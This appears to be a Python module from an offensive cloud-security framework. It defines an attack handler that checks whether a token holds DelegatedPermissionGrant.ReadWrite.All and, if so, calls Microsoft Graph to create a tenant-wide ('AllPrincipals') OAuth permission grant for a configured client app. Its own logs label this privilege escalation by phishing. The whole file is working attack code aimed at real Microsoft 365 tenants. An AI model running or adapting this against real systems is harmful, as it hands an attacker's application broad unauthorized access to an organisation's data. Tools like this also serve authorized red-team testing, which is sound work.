from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.oauth_deleg_handler')


class OAuthDeleg_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "DelegatedPermissionGrant.ReadWrite.All" in request.roles:
            status = False
            attack_name = "DelegatedPermissionGrantVectors"
            message = ""
            error = "DelegatedPermissionGrantVectors - failed"
            conf = request.attack_config['oauthDeleg']
            
            logger.debug("DelegatedPermissionGrant.ReadWrite.All - Allows the app to manage permission grants for delegated permissions exposed by any API (including Microsoft Graph), on behalf of the signed in user.")
            logger.debug("Attack vector - priv esc by phishing.")         
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
                message_obj = {
                    "clientId": conf["clientId"],
                    "consentType": "AllPrincipals",
                    "resourceId": conf["ResourceId"],
                    "scope": conf["permission"]
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                    message += "permissions added  \n" 
                    status = True
  
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in oauth_handler_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
